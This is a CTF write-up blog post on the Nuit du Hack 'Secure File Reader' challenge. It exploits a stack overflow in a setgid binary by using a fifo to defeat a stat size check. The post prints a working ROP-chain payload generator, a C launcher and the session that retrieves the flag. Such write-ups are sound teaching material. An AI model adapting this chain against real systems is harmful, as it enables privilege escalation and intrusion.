---
layout: post
title: "Nuit du Hack - Secure File Reader"
date: 2016-04-03 01:00
categories: ctf exploit
---

The qualifications for the [Nuit du Hack CTF][ndh] were held this weekend. It
proposed there pwnable challenges. That one involved an ELF 32-bit binary with
a buffer overflow on the stack that is used to push a ROP chain to execute a
shell and finally get to flag.

# Basic Information

From the organizers:
{% highlight shell-session %}
Description

Hi, I have secured my file reader so that you won't be able to pwn it. You
know, I have pretty good skills in security.

Don't even try to beat me!

The challenge is available at securefilereader.quals.nuitduhack.com:55552
(chall:chall)

Points
200

Category
Exploit Me
{% endhighlight %}

The provided connection information must be used to connect with SSH to the machine:
{% highlight shell-session %}
$ ssh chall@securefilereader.quals.nuitduhack.com -p 55552
chall@securefilereader.quals.nuitduhack.com's password:
[snip]
chall@e09fe5638705:~$ uname -a
Linux 22f353d2ab05 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt20-1+deb8u3
(2016-01-17) x86_64 GNU/Linux
chall@e09fe5638705:~$ ls -la
total 752
dr-xr-xr-x 1 root  root            68 Mar 11 11:04 .
drwxr-xr-x 1 root  root            32 Mar 11 11:04 ..
-rwxr-xr-x 1 chall chall            1 Apr  2 18:27 .bash_logout
-rw-r--r-- 1 chall chall            7 Apr  2 17:46 .bashrc
-rw-r--r-- 1 chall chall          675 Mar 11 11:04 .profile
-r--r----- 1 root  chall_pwned     29 Mar 11 11:03 flag
-r-xr-sr-x 1 root  chall_pwned 750269 Mar 11 11:03 pwn
{% endhighlight %}

The binary has the setgid flag set so that it can access `flag`.

The host has a limited set of installed package; there is no debugger and
python is not installed. Let's copy it locally so that we can debug it. The
file is an ELF 32-bit, not stripped and statically linked. The only security
feature enabled is NX:
{% highlight shell-session %}
$ file pwn
pwn: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.24,
BuildID[sha1]=acc530c91c4841537384866623e6dc50074105c8, not stripped

$ checksec --file pwn
RELRO           STACK CANARY      NX            PIE             RPATH
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH
RUNPATH      FILE
No RUNPATH   pwn
{% endhighlight %}

# Operation

The binary need a file passed as argument:
{% highlight shell-session %}
$ ./pwn 
Usage ./prog <filename>
$ ./pwn <(echo toto)
The file has been saved successfully
{% endhighlight %}

The file is not really saved anywhere, its content is just copied on the stack of the binary:
{% highlight ca65 %}
[0x08048d2a]> pdf @main
[snip]
0x08048f71      8b450c         mov eax, dword [ebp+arg_ch] ; [0xc:4]=0
0x08048f74      83c004         add eax, 4
0x08048f77      8b00           mov eax, dword [eax]
0x08048f79      890424         mov dword [esp], eax
0x08048f7c      e885ffffff     call sym.safe_save
[snip]
[0x08048d2a]> pdf @sym.safe_save
[snip]
0x08048f0f      8b4508         mov eax, dword [ebp+arg_8h] ; [0x8:4]=0
0x08048f12      890424         mov dword [esp], eax
0x08048f15      e82affffff     call sym.check_size
[snip]
0x08048f1e      8d85f8efffff   lea eax, dword [ebp - local_1008h]
0x08048f24      89442404       mov dword [esp + 4], eax
0x08048f28      8b4508         mov eax, dword [ebp+arg_8h] ; [0x8:4]=0
0x08048f2b      890424         mov dword [esp], eax
0x08048f2e      e841ffffff     call sym.save_in_buffer
[snip]
[0x08048d2a]> pdf @sym.save_in_buffer
[snip]
0x08048ede      c74424080001.  mov dword [esp + 8], 0x100  ; [0x100:4]=0x554e47
0x08048ee6      8d85effeffff   lea eax, dword [ebp - local_111h]
0x08048eec      89442404       mov dword [esp + 4], eax
0x08048ef0      8b45f4         mov eax, dword [ebp - local_ch]
0x08048ef3      890424         mov dword [esp], eax
0x08048ef6      e8557b0200     call sym.__read
[snip]

{% endhighlight %}

From the `main` function, `safe_size` is called. It starts by checking the size
of the file passed as argument. If it is bigger than 0x100 bytes, it exits.
Otherwise it continues by calling `save_in_buffer` with the address of the
buffer. `save_in_buffer` reads the file and puts its content in the provided
buffer through the `strncat`.

# Vulnerability

The function `check_size` calls the [`stat`][stat] function to get the size of
the provided file. There are at least two possibilities to trick `stat` into
believing that the file is small:

* race condition: create a small file and increase its size after `stat` is called
* use a fifo

The latter is easier to setup and more reliable. I usually tend to work with
fifo when I debug binaries because I find that this is easier to interact with
binaries that way:
{% highlight shell-session%}
$ gdb -q pwn
Reading symbols from pwn...(no debugging symbols found)...done.
gdb-peda$ r fifo
Starting program: pwn fifo
{% endhighlight %}

From another terminal:
{% highlight shell-sesion %}
$ python -c "print('A'*4200)" > fifo
{% endhighlight %}

Back in the debugger:
{% highlight shell-session %}
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x25 ('%')
EBX: 0x80481b0 (<_init>:  push   ebx)
ECX: 0x80ef4d4 --> 0x0 
EDX: 0x25 ('%')
ESI: 0x0 
EDI: 0x80ee00c --> 0x8067e60 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
EBP: 0x41414141 ('AAAA')
ESP: 0xffe5af00 ('A' <repeats 72 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffe5af00 ('A' <repeats 72 times>)
0004| 0xffe5af04 ('A' <repeats 68 times>)
0008| 0xffe5af08 ('A' <repeats 64 times>)
0012| 0xffe5af0c ('A' <repeats 60 times>)
0016| 0xffe5af10 ('A' <repeats 56 times>)
0020| 0xffe5af14 ('A' <repeats 52 times>)
0024| 0xffe5af18 ('A' <repeats 48 times>)
0028| 0xffe5af1c ('A' <repeats 44 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
{% endhighlight %}

We control `eip`! 4128 bytes are needed to overwrite it:
{% highlight shell-session %}
$ python2 -c 'print "A"*4124 + "BBBB"' > fifo

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x25 ('%')
EBX: 0x80481b0 (<_init>:	push   ebx)
ECX: 0x80ef4d4 --> 0x0 
EDX: 0x25 ('%')
ESI: 0x0 
EDI: 0x80ee00c --> 0x8067e60 (<__stpcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EBP: 0x41414141 ('AAAA')
ESP: 0xffbece60 --> 0xffbed000 --> 0x3 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffbece60 --> 0xffbed000 --> 0x3 
0004| 0xffbece64 --> 0xffbecf04 --> 0xffbed0c7 ("/home/abe/ctf/ndh/secure_file_reader/pwn")
0008| 0xffbece68 --> 0xffbecf10 --> 0xffbed0f5 ("XDG_VTNR=1")
0012| 0xffbece6c --> 0x80481b0 (<_init>:	push   ebx)
0016| 0xffbece70 --> 0x0 
0020| 0xffbece74 --> 0x80ee00c --> 0x8067e60 (<__stpcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
0024| 0xffbece78 --> 0x8049710 (<__libc_csu_fini>:	push   ebx)
0028| 0xffbece7c --> 0x804915a (<__libc_start_main+458>:	mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
{% endhighlight %}

# Exploitation

ret2libc is not possible because the functions `system` and `exec`, and the
libc is not linked with it (remember that the binary is statically linked). We
will have to do a ROP chain. [`ROPgadget`][ropgadget] is a good tool to find
ROP gadgets in binaries. The different kind of ROP chain could be built, such
as executing the [`mprotect`][mprotect] [`syscall`][syscall] to remove NX and
then jump on a shellcode on the stack. By looking at the only gadget with `int
0x80` to trigger the syscall, we can see that it doesn't end with a return.
Therefore we only can execute one syscall and that's it. The only one feasible
is [`execve`][execve] to pop a shell. As syscalls are fastcall, argument must
be supplied in registers:

* `eax`: syscall number => `11`
* `ebx`: pointer to `/bin/sh` => need to find one
* `ecx`: pointer to `argv[]` => useless, put `0`
* `edx`: pointer to `envp[]` => useless, put `0`

## Finding /bin/sh
The `/bin/sh`string could be passed in the payload and then the value of `esp`
could be gathered to reference it, but no such gadget was available. One
possibility would be to push with the ROP chain two words `/bin` and `/sh\0`
into a fixed location such as the `.data`segment. Or to provide it through a
environment variable. I chose the latter possibility. A pointer to the
environment variable is available here:
{% highlight shell-session %}
gdb-peda$ x/wx &environ
0x80ef54c <environ>:	0xffbecf10
gdb-peda$ x/wx environ
0xffbecf10:	0xffbed0f5
gdb-peda$ x/s *environ
0xffbed0f5:	"XDG_VTNR=X"
{% endhighlight %}

`0x80ef54c` is the address containing a pointer (`0xffbecf10`) to the first
environment variable (`0xffbed0f5`).

To control the environment variables passed to a program, we need to create a
launcher that will clear them all and add our `/bin/sh`. As python is not
available, let's do it in C:
{% highlight C %}
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  char *env[2];
  char *argv[3];
  clearenv();
  argv[0] = "/home/chall/pwn";
  argv[1] = "path/to/fifo";
  argv[2] = NULL;
  env[0] = "s=/bin/sh";
  env[1] = NULL;
  execve("/home/chall/pwn", argv, env);
  exit(0);
}
{% endhighlight %}

## ROP chain

Here is the python script that generate the payload which is then cast into the
fifo:
{% highlight python %}
#!/usr/bin/env python2

from pwn import p32

environ_addr = 0x80ef54c

payload = 'A' * 4124

# set ebx = addr /bin/sh in first env var
# ecx is also set
payload += p32(0x08072731) # pop ecx ; pop ebx ; ret
payload += p32(0xffffffff)
payload += p32(0xffffffff)
payload += p32(0x080de209) # : inc ebx ; ret
payload += p32(0x080ddf6c) # : inc ecx ; ret
payload += p32(0x0807270a) # : pop edx ; ret
payload += p32(environ_addr)
payload += p32(0x080da8e6) # : mov edi, dword ptr [edx] ; ret
payload += p32(0x080483ae) # : pop ebp ; ret (just to have a valid address in edx)
payload += p32(environ_addr)
payload += p32(0x08050b60) # : mov eax, edi ; mov edx, ebp ; pop edi ; pop ebp ; ret
payload += p32(0x41414141) * 2
payload += p32(0x080eaa2d) # : add ebx, dword ptr [eax] ; add dword ptr [edx], ecx ; ret

# to pass by the 's=' in the env var
payload += p32(0x080de209) # inc ebx ; ret
payload += p32(0x080de209) # inc ebx ; ret

# set eax
payload += p32(0x080beb26) # pop eax ; ret
payload += p32(0xf5fed208) # hex(0xffffffff - 0xa012e03+1 + 11)
payload += p32(0x080e5e43) # add eax, 0xa012e03 ; ret

# set edx
payload += p32(0x0807270a) # pop edx ; ret
payload += p32(0xffffffff) #
payload += p32(0x0805d6f7) # inc edx ; ret

# syscall
payload += p32(0x08049501) # int 0x80

print payload
{% endhighlight %}

## Execution

The `/tmp` directory was writable but not readable, it was therefore a good
place to hide our files. Here are the steps need to finally exploit the binary:

* create a directory `/tmp/something` on the remote machine
* generate the payload with the python script
* compile the launcher
* `scp` both files to `/tmp/something`
* open two ssh connections:
  1. create a fifo `/tmp/something/fifo` and `cat payload > fifo`
  2. execute the launcher

{% highlight shell-session %}
chall@73ca0efc4605:~$ /tmp/something/launch
The file has been saved successfully
$ ls
flag  pwn
$ cat flag
rUN!RuN$RUn!Y0U$W1N_TH3_R4c3
$
{% endhighlight %}

It would have been easier to push `/bin/sh` into the `.data` segment...

[ndh]: https://quals.nuitduhack.com/
[stat]: http://man7.org/linux/man-pages/man2/stat.2.html
[ropgadget]: https://github.com/JonathanSalwan/ROPgadget
[mprotect]: http://man7.org/linux/man-pages/man2/mprotect.2.html
[syscall]: http://man7.org/linux/man-pages/man2/syscall.2.html
[execve]: http://man7.org/linux/man-pages/man2/execve.2.html
